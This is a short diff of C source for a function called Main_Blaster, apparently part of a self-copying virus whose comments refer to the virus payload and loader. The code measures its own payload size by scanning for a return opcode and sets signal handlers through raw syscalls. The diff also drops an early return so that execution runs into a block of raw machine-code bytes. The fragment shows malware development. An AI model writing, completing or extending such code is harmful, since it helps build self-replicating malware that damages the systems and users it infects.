@@ -7,14 +7,14 @@ void		Main_Blaster ( void ) {
 	Syscall2( __NR_signal, SIGUSR2, (long)&security_viruse );
 
 	/* -- Get size of viruses. (PAYLOAD) -- */
-	uint32_t 	size = ((uint32_t)&Blaster_end - (uint32_t)&Blaster_start);	
+	uint32_t 	size = ((uint32_t)&Blaster_end - (uint32_t)&loader);	
 	unsigned char	*p = (unsigned char*)&Blaster_end;
 	for( ; ; ++p, ++size) {
 		if (*p == 0XC3) { ++size; break; }
 	}
 
 	/* -- Get size of loader. -- */
-	uint32_t	__attribute__((unused)) size_loader = ((uint32_t)&Blaster_start - (uint32_t)&loader);
+	uint32_t	__attribute__((unused)) size_loader = ((uint32_t)&Main_Blaster - (uint32_t)&loader);
 
 	/* -- Get date -- */
 	struct timeval __attribute__((unused))tv = {0};
@@ -26,13 +26,11 @@ void		Main_Blaster ( void ) {
 	long __attribute__((unused))pid = Syscall0( __NR_getpid );
 	Syscall2( __NR_kill, pid, SIGUSR1);
 
-	return ;
 	/*char __attribute__((unused))*user_data = (char *)Syscall6(__NR_mmap2, 0, USER_MEMORY_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0 );	
 	if ( (long)user_data == -ENOMEM ) {
 		// -- Memory unavailable -- //
 		Syscall1( __NR_exit, 1 );
 	}*/
-
 	asm (".byte 0XA0,0X7C,0X57,0XB3,0X0F,0X6B,0X46,0X23,0X7E,0XD9,0X35,0X11,0XEC,0XC9,0X25,0X00");
 }
 
